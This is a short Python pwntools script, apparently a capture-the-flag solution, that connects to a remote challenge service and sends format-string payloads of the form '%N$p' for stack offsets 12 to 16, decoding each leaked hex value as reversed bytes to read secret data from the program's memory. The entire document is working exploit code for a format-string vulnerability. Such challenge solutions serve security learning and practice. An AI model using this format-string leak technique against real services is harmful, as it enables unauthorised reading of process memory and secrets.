from pwn import *
from binascii import unhexlify

for i in range(12, 17):
    p = remote("0.cloud.chals.io", 12690)
    m = p.recvuntil(b"battle?\n")
    f = b"%" + bytes(str(i), "latin-1") + b"$p"
    # print(f.split(b"\n"))
    p.sendline(f)
    k = p.recv()
    print(unhexlify(k.split(b"\n")[2][2:])[::-1])
    # print(k)
